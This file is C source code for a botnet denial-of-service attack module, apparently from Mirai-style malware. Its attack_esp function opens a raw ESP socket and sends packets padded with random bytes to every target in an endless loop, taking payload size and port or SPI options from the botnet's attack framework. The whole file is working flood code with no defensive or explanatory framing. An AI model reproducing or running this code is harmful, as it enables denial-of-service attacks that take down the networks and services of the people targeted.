#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"

struct esp_header {
    uint32_t spi;
    uint32_t seq;
};

void attack_esp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 128);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff); 

    if (data_len > 1400) {
        data_len = 1400;
    }

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_ESP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    
    

    for (i = 0; i < targs_len; i++)
    {
        struct esp_header *esph;
        char *payload;
        int packet_size = sizeof(struct esp_header) + data_len;

        pkts[i] = calloc(packet_size, sizeof (char));
        esph = (struct esp_header *)pkts[i];
        payload = (char *)(esph + 1);

        
        if (dport == 0xffff)
            esph->spi = rand_next();
        else
            esph->spi = htonl(dport);
            
        esph->seq = htonl(1);

        rand_str(payload, data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct esp_header *esph = (struct esp_header *)pkt;
            int packet_size = sizeof(struct esp_header) + data_len;

            esph->seq++;
            
            
            targs[i].sock_addr.sin_port = htons(dport); 
            sendto(fd, pkt, packet_size, 0, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}
